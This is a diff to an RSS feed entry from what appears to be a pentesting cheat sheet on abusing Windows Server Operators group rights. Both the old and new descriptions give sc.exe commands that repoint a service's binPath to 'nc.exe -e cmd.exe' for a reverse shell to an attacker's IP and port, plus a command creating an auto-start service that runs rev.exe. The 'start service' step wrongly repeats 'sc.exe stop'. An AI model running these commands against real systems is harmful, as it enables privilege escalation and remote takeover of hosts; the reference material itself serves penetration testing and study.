@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/server_operators/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/server_operators/</guid>
-      <description>Abuse #1: Change service path # Change a service path (e.g. browser) sc.exe config browser binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; # Stop service sc.exe stop browser # Start service sc.exe stop browser Additional: Create service # Create a service sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto </description>
+      <description>Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; # Start service sc.exe stop &amp;lt;SERVICE&amp;gt; Additional: Create service # Create a service sc.exe create &amp;lt;NEW_SERVICE&amp;gt; binpath= C:\ProgramData\rev.exe start= auto Note: there is a space after named arguments</description>
     </item>
   </channel>
 </rss>
